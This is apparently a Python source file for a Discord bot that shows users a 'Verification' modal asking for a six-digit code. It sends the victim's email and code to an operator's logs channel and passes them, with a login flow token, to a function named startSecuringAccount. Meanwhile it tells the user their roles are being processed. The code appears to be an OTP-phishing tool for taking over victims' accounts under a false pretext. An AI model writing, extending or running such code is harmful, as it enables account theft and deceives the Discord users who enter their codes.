from views.utils.startSecure import startSecuringAccount
from discord import ui
import discord
import json

config = json.load(open("config.json", "r+"))
data = json.load(open("data.json", "r+"))

print(f"\n\n\nEmail: {data["email"]}\n\n\n")
class MyModalTwo(ui.Modal, title="Verification"):
    box_three = ui.TextInput(label="Code", required=True)

    async def on_submit(self, interaction: discord.Interaction, /) -> None:
        if len(str(self.box_three.value)) != 6:
            await interaction.response.send_message(
                "❌ | The code must be 6 digits long.", 
                ephemeral=True
            )
            return  
        
        logs_channel = interaction.client.get_channel(config["discord"]["logs_channel"])
        Code_embed = discord.Embed(
            title="Got OTP Verication",
            description=f"**Email**\n```{data["email"]}```\n**Code**\n```{self.box_three.value}```\n**Status**\n```Securing...```",
            colour=0x008000
        )

        await logs_channel.send(embed=Code_embed)
        startSecuringAccount(data["email"], data["flowtoken"], self.box_three.value)        
        #######################
        # Generate Temp Email #
        #######################

        await interaction.response.send_message(
            "⌛ Please Allow Up To One Minute For Us To Proccess Your Roles...", ephemeral=True
        )
